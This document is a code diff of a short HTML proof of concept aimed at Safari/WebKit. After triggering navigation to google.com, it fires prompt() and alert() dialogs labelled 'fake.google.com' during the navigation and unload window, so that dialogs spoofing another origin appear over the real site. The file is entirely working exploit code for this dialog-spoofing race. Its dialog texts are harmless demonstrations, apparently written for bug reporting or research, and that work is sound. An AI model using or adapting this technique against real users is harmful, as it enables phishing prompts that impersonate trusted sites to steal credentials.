@@ -2,27 +2,47 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Safari Dialog Timing PoC</title>
+<title>Safari Dialog Lifecycle PoC</title>
 </head>
+
 <body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;">
 <h3>Loading…</h3>
 
 <script>
-// delay kecil biar page settle
+// Force history entry (relevant to WebKit lifecycle bugs)
+history.pushState({}, "", "#init");
+
+// Register beforeunload (often buggy in WebKit)
+window.addEventListener("beforeunload", function () {
+  // intentionally empty
+});
+
+// Step 1: allow page to settle
 setTimeout(() => {
 
-  // trigger top-level navigation
-  location.href = "https://google.com";
+  // Step 2: trigger top-level navigation
+  location.href = "https://www.google.com";
 
-  // dialog during navigation window
+  // Step 3: race dialog against navigation + unload
   setTimeout(() => {
-    prompt(
-      "fake.google.com\n⚠️ Do not sign into your account",
-      ""
-    );
-  }, 40);
+    try {
+      prompt(
+        "fake.google.com\n⚠️ Do not sign into your account",
+        ""
+      );
+    } catch (e) {}
+  }, 20);
 
-}, 300);
+  // Step 4: reinforce timing window
+  setTimeout(() => {
+    try {
+      alert(
+        "fake.google.com\nThis dialog should not survive navigation"
+      );
+    } catch (e) {}
+  }, 60);
+
+}, 250);
 </script>
 </body>
 </html>
